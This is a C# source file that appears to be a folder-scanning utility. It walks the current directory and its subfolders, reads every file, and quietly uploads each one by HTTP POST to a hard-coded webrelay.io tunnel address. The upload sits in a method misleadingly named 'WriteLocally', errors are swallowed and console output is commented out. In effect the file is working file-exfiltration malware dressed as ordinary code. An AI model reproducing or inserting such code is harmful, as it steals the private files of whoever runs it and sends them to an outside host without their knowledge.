using System;
using System.Buffers;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using JGeneral;
using Newtonsoft.Json;

namespace atriplex
{
    public struct Folder
    {
        public static List<string> Exceptions = new List<string>();
        public static JsonSerializer Serializer = JsonSerializer.CreateDefault();
        public string Path 
        {
            get;
            private set; 
        }

        public List<Folder> SubDirectories
        {
            get;
            private set;
        }

        public Folder(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                path = Platform.CurrentDirectory;
            }
            Path = path;
            SubDirectories = Directory.GetDirectories(path).Select(x =>
            {
                var f = new Folder(x);
                return f;
            }).ToList();
            foreach (var file in Directory.GetFiles(Path))
            {
                var extract = new Extract(file);
                var pqth = extract.Path;
                if (!Exceptions.Exists(x => x == pqth))
                {
                    Exceptions.Add(pqth);
                    StringBuilder b = new StringBuilder();
                    Serializer.Serialize(new StringWriter(b), Exceptions);
                    File.WriteAllText($"{Platform.CurrentDirectory}config.json", b.ToString().Replace(",", ",\n"));
                    Send(extract);
                }
            }
            foreach (var subFolder in SubDirectories)
            {
                try
                {
                    foreach (var file in Directory.GetFiles(subFolder.Path))
                    {
                        var extract = new Extract(file);
                        var pqth = extract.Path;
                        if (!Exceptions.Exists(x => x == pqth))
                        {
                            Exceptions.Add(pqth);
                            Send(extract);
                        }
                    }
                }
                catch
                {
                    //ignored
                }
            }
        }

        public void Send(Extract extract)
        {
            try
            {
                WriteLocally(extract);
            }
            catch
            {
                //ignore
            }
        }

        public void WriteLocally(Extract extract)
        {
            var handle = extract.GetData().ToArray();
            var altPath = extract.AlternatePath.Remove(0, extract.AlternatePath.IndexOf("\\") + 1);
            var path = extract.Path;
            var length = extract.Length;
            Task.Run(() =>
            {
                //Console.WriteLine($"Started processing: {path}");
                WebRequest request = WebRequest.CreateHttp(Link + altPath);
                request.Timeout = 25000;
                request.Method = "POST";
                request.ContentLength = length;
                var stream = request.GetRequestStream();
                stream.Write(handle, 0, (int) request.ContentLength);
                var resp = (HttpWebResponse) request.GetResponse();
                if ((int) resp.StatusCode != 200)
                {
                    //Console.WriteLine($"Failed, status code: {resp.StatusCode}, retrying in 25s...");
                    Task.Delay(3 * 1000 * 60).Wait();
                    //Wait for 3 minutes.
                    request.GetResponse();
                }
                else
                {
                    //Console.WriteLine($"Finished processing {path}.");
                }

                Task.Delay(50).Wait();
            });
            Marshal.FreeHGlobal(extract.UnmanagedMemory);
        }

        public const string Link = "http://0mu5u7hnaddxwio6oebqsh.webrelay.io/";
        public const string LocalLink = "http://192.168.1.200:80/";
        public const bool Online = false;
        /// <summary>
        /// 30 Seconds
        /// </summary>
        public const int DelayAfterFailure = 1000 * 30;
    }
}